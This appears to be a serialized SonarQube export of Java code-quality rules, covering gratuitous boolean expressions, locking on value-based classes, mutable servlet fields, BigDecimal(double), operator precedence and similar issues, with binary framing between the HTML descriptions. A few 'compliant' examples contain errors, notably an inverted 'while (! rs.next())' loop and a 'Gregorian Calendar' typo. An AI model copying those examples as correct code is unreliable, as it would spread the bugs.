  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
±

java:S2589¢
javaS2589,Boolean expressions should not be gratuitous"MAJOR*java:À
<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; "a" is always "true"
  doSomething();
}

if (c || !a) { // Noncompliant; "!a" is always "false"
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
ù

java:S5612é
javaS5612&Lambdas should not have too many lines"MAJOR*java:Ω<p>Lambdas (introduced with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class or method.
But those lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly
become unreadable.</p>Z
CODE_SMELL
∫

java:S3436´
javaS34362Value-based classes should not be used for locking"MAJOR*java:’<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization...
</blockquote>
<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to
<code>struct</code>s in other languages) that will come in future versions of Java.</p>
<blockquote>
  <p> Instances of a value-based class ... </p>
  <ul>
    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no committment as to the identity of
    returned instances; </li>
  </ul>
</blockquote>
<p>Which means that you can't be sure you're the only one trying to lock on any given instance of a value-based class, opening your code up to
contention and deadlock issues.</p>
<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>
<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>
package except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,
<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,
<code>OptionalLong</code>, <code>OptionalInt</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;Foo&gt; fOpt = doSomething();
synchronized (fOpt) {  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>ZBUG
â	

java:S2226˙
javaS22260Servlets should not have mutable instance fields"MAJOR*java:¶<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to
process the request. So all threads share the servlet instances and by extension their instance fields. To prevent any misunderstanding and unexpected
behavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>
<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  private String userName;  //As this field is shared by all users, it's obvious that this piece of information should be managed differently
  ...
}
</pre>
<p>or </p>
<pre>
public class MyAction extends Action {
  private String userName;  //Same reason
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EYBUC">CERT, MSC11-J.</a> - Do not let session information leak within a servlet </li>
</ul>ZBUG
⁄

java:S1134À
javaS1134Track uses of "FIXME" tags"MAJOR*java:Ü<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
Ä

java:S3553Ò
javaS3553,"Optional" should not be used for parameters"MAJOR*java:ö<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a
method may or may not return a value. </p>
<p>And for that, it's valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really
increasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,
non-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are
optional, and there's really no reason to have <code>Optional</code> parameters.</p>
<p>The rule also checks for Guava's <code>Optional</code>, as it was the inspiration for the JDK <code>Optional</code>. Although it is different in
some aspects (serialization, being recommended for use as collection elements), using it as a parameter type causes exactly the same problems as for
JDK <code>Optional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String sayHello(Optional&lt;String&gt; name) {  // Noncompliant
  if (name == null || !name.isPresent()) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String sayHello(String name) {
  if (name == null) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>Z
CODE_SMELL
Ü

java:S2583˜

javaS25831Conditionally executed blocks should be reachable"MAJOR*java:¢
<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; "!a" is always "true", "b" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue in either of these cases:</p>
<ul>
  <li> When the condition is a single <code>final boolean</code> </li>
</ul>
<pre>
final boolean debug = false;
//...
if (debug) {
  // Print something
}
</pre>
<ul>
  <li> When the condition is literally <code>true</code> or <code>false</code>. </li>
</ul>
<pre>
if (true) {
  // do something
}
</pre>
<p>In these cases it is obvious the code is as intended.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
·

java:S3551“
javaS3551DOverrides should match their parent class methods in synchronization"MAJOR*java:Í<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper
synchronization as callers rely on the thread-safety promised by the parent class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

 @Override
  public foo () {  // Noncompliant
    // ...
    super.foo();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

  @Override
  synchronized foo () {
    // ...
    super.foo();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/XgAZAg">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are
  not thread-safe </li>
</ul>ZBUG
√

java:S3439¥
javaS3439T"DefaultMessageListenerContainer" instances should not drop messages during restarts"MAJOR*java:º<p><code>DefaultMessageListenerContainer</code> is implemented as a JMS poller. While the Spring container is shutting itself down, as each
in-progress JMS <code>Consumer.receive()</code> call completes, any non-<code>null</code> return value will be a JMS message that the DMLC will
<em>discard</em> due to the shutdown in progress. That will result in the received message never being processed. </p>
<p>To prevent message loss during restart operations, set <code>acceptMessagesWhileStopping</code> to <code>true</code> so that such messages will be
processed before shut down.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;bean id="listenerContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer"&gt;  &lt;!-- Noncompliant --&gt;
   &lt;property name="connectionFactory" ref="connFactory" /&gt;
   &lt;property name="destination" ref="dest" /&gt;
   &lt;property name="messageListener" ref="serviceAdapter" /&gt;
   &lt;property name="autoStartup" value="true" /&gt;
   &lt;property name="concurrentConsumers" value="10" /&gt;
   &lt;property name="maxConcurrentConsumers" value="10" /&gt;
   &lt;property name="clientId" value="myClientID" /&gt;
&lt;/bean&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;bean id="listenerContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer"&gt;
   &lt;property name="connectionFactory" ref="connFactory" /&gt;
   &lt;property name="destination" ref="dest" /&gt;
   &lt;property name="messageListener" ref="serviceAdapter" /&gt;
   &lt;property name="autoStartup" value="true" /&gt;
   &lt;property name="concurrentConsumers" value="10" /&gt;
   &lt;property name="maxConcurrentConsumers" value="10" /&gt;
   &lt;property name="clientId" value="myClientID" /&gt;
   &lt;property name="acceptMessagesWhileStopping" value="true" /&gt;
&lt;/bean&gt;
</pre>ZBUG
ù


java:S2109é

javaS2109>Reflection should not be used to check non-runtime annotations"MAJOR*java:¨	<p>The writer of an annotation can set one of three retention policies for it:</p>
<ul>
  <li> <code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>,
  <code>@SuppressWarnings</code>. </li>
  <li> <code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the
  default. </li>
  <li> <code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM. </li>
</ul>
<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any
other retention policy is simply an error, since the test will always return false.</p>
<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Method m = String.class.getMethod("getBytes", new Class[] {int.class,
int.class, byte[].class, int.class});
if (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code
</pre>ZBUG
á

java:S3438¯
javaS3438K"SingleConnectionFactory" instances should be set to "reconnectOnException""MAJOR*java:â<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic
connection recovery when the connection goes bad. </p>
<p>That's because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this
connection factory (Spring's <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won't work because the
<code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing
anything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;  &lt;!-- Noncompliant --&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory" p:reconnectOnException="true"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<p>or</p>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
   &lt;property name="reconnectOnException"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;
 &lt;/bean&gt;
</pre>ZBUG
Ù
	java:S864Ê
javaS864:Limited dependence should be placed on operator precedence"MAJOR*java:Ç<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex
statements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>
<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational
operators are used in together in a condition, and for other operator combinations according to the following table:</p>
<table>
  <tbody>
    <tr>
      <td> </td>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td><code>&amp;</code></td>
      <td><code>^</code></td>
      <td> <code>|</code> </td>
    </tr>
    <tr>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&amp;</code></td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>^</code></td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
    </tr>
    <tr>
      <td> <code>|</code> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
    </tr>
  </tbody>
</table>
<p>This rule also raises an issue when the "true" or "false" expression of a ternary operator is not trivial and not wrapped inside parentheses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x = a + b - c;
x = a + 1 &lt;&lt; b;  // Noncompliant
y = a == b ? a * 2 : a + b;  // Noncompliant

if ( a &gt; b || c &lt; d || a == d) {...}
if ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant
if (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a + b - c;
x = (a + 1) &lt;&lt; b;
y = a == b ? (a * 2) : (a + b);

if ( a &gt; b || c &lt; d || a == d) {...}
if ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}
if ( (a = f(b,c)) == 1) { ... }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_wI">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9wHEAw">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/783.html">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>
</ul>Z
CODE_SMELL
ﬂ

java:S2116–
javaS2116A"hashCode" and "toString" should not be called on array instances"MAJOR*java:Î<p>While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array's
"identity hash code", and <code>toString</code> returns nearly the same value. Neither method's output actually reflects the array's contents.
Instead, you should pass the array to the relevant static <code>Arrays</code> method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main( String[] args )
{
    String argStr = args.toString(); // Noncompliant
    int argHash = args.hashCode(); // Noncompliant

</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main( String[] args )
{
    String argStr = Arrays.toString(args);
    int argHash = Arrays.hashCode(args);

</pre>ZBUG
ﬁ

java:S2234œ
javaS22340Parameters should be passed in the correct order"MAJOR*java:Ù<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when
the names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead
to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public double divide(int divisor, int dividend) {
  return divisor/dividend;
}

public void doTheThing() {
  int divisor = 15;
  int dividend = 5;

  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public double divide(int divisor, int dividend) {
  return divisor/dividend;
}

public void doTheThing() {
  int divisor = 15;
  int dividend = 5;

  double result = divide(divisor, dividend);
  //...
}
</pre>Z
CODE_SMELL
û

java:S1145è
javaS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*java:•<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {
  doSomething();
}
...
if (false) {
  doSomethingElse();
}

if (2 &lt; 3 ) { ... }  // Noncompliant; always false

int i = 0;
int j = 0;
// ...
j = foo();

if (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization

boolean b = true;
//...
if (b || !b) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=squid%3AS2583'>S2583</a> instead.</p>ZBUG
Í

java:S2114€
javaS2114BCollections should not be passed as arguments to their own methods"MAJOR*java:ı<p>Passing a collection as an argument to the collection's own method is either an error - some other argument was intended - or simply nonsensical
code. </p>
<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in
undefined behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();
objs.add("Hello");

objs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called
objs.addAll(objs); // Noncompliant; behavior undefined
objs.containsAll(objs); // Noncompliant; always true
objs.removeAll(objs); // Noncompliant; confusing. Use clear() instead
objs.retainAll(objs); // Noncompliant; NOOP
</pre>ZBUG
º

java:S1144≠
javaS1144*Unused "private" methods should be removed"MAJOR*java:ÿ<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }
  private void unusedPrivateMethod(){...}
  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism
  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }

  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism

  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue on annotated methods.</p>Z
CODE_SMELL
Õ

java:S2111æ
javaS2111'"BigDecimal(double)" should not be used"MAJOR*java:Û<p>Because of floating point imprecision, you're unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>
<p>From <a href="http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)">the JavaDocs</a>:</p>
<blockquote>
  The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which
  is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to
  0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a
  binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances
  notwithstanding.
</blockquote>
<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the
constructor that takes a <code>String</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above
BigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result
</pre>
<h2>Compliant Solution</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = BigDecimal.valueOf(d);
BigDecimal bd2 = new BigDecimal("1.1"); // using String constructor will result in precise value
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NQAVAg">CERT, NUM10-J.</a> - Do not construct BigDecimal objects from floating-point
  literals </li>
</ul>ZBUG
Ó

java:S2232ﬂ
javaS2232'"ResultSet.isLast()" should not be used"MAJOR*java:ç<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code>
result sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear
on what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
stmt.executeQuery("SELECT name, address FROM PERSON");
ResultSet rs = stmt.getResultSet();
while (! rs.isLast()) { // Noncompliant
  // process row
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ResultSet rs = stmt.executeQuery("SELECT name, address FROM PERSON");
while (! rs.next()) {
  // process row
}
</pre>Z
CODE_SMELL
ÿ

java:S2112…
javaS21121"URL.hashCode" and "URL.equals" should be avoided"MAJOR*java:Ì
<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both may trigger a name service (usually DNS) lookup to
resolve the host name or IP address. Depending on the configuration, and network status, that can take a long time. <code>URI</code> on the other hand
makes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>
<p>In general it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can just convert the
<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>
<p>This rule checks for uses of <code>URL</code> 's in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and
<code>hashCode</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();  // Noncompliant

  URL homepage = new URL("http://sonarsource.com");  // Compliant
  if (homepage.equals(url)) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant

  URI homepage = new URI("http://sonarsource.com");  // Compliant
  URI uri = url.toURI();
  if (homepage.equals(uri)) {  // Compliant
    // ...
  }
}
</pre>Z
CODE_SMELL
‡

java:S2230—
javaS22301Non-public methods should not be "@Transactional""MAJOR*java:¸<p>Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn't "see" non-<code>public</code>
methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.</p>
<p>Therefore marking a <code>private</code> method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the
method is actually written to be <code>@Transactional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Transactional  // Noncompliant
private void doTheThing(ArgClass arg) {
  // ...
}
</pre>ZBUG
ü

java:S1142ê
javaS11422Methods should not have too many return statements"MAJOR*java:≥<p>Having too many return statements in a method increases the method's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public boolean myMethod() { // Noncompliant; there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>Z
CODE_SMELL
∫

java:S2110´
javaS2110(Invalid "Date" values should not be used"MAJOR*java:ﬂ<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month
starts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12
for month, and you'll get January of the following year.</p>
<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and
<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>
<table>
  <tbody>
    <tr>
      <th>Field</th>
      <th>Valid</th>
    </tr>
    <tr>
      <td>month</td>
      <td>0-11</td>
    </tr>
    <tr>
      <td>date (day)</td>
      <td>0-31</td>
    </tr>
    <tr>
      <td>hour</td>
      <td>0-23</td>
    </tr>
    <tr>
      <td>minute</td>
      <td>0-60</td>
    </tr>
    <tr>
      <td>second</td>
      <td>0-61</td>
    </tr>
  </tbody>
</table>
<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(12);  // Noncompliant; rolls d into the next year

Calendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant
if (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(11);

Calendar c = new Gregorian Calendar(2014, 11, 25);
if (c.get(Calendar.MONTH) == 11) {
  // ...
}
</pre>ZBUG


	java:S881‚

javaS881~Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression"MAJOR*java:∫	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>Z
CODE_SMELL
†

java:S1141ë
javaS1141%Try-catch blocks should not be nested"MAJOR*java:¡<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand
which block will catch which exception.</p>Z
CODE_SMELL
¥	

java:S2118•	
javaS2118.Non-serializable classes should not be written"MAJOR*java:”<p>Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown.
Only a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized). </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Vegetable {  // neither implements Serializable nor extends a class that does
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);  // Noncompliant. Nothing will be written
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Vegetable implements Serializable {  // can now be serialized
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);
  }
}
</pre>ZBUG
Á

java:S1149ÿ
javaS1149QSynchronized classes Vector, Hashtable, Stack and StringBuffer should not be used"MAJOR*java:‹<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them
thread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.</p>
<p>It is better to use their new unsynchronized replacements:</p>
<ul>
  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>
  <li> <code>Deque</code> instead of <code>Stack</code> </li>
  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>
  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Vector cats = new Vector();
</pre>
<h2>Compliant Solution</h2>
<pre>
ArrayList cats = new ArrayList();
</pre>
<h2>Exceptions</h2>
<p>Use of those synchronized classes is ignored in the signatures of overriding methods.</p>
<pre>
@Override
public Vector getCats() {...}
</pre>Z
CODE_SMELL
ƒ


java:S3655µ

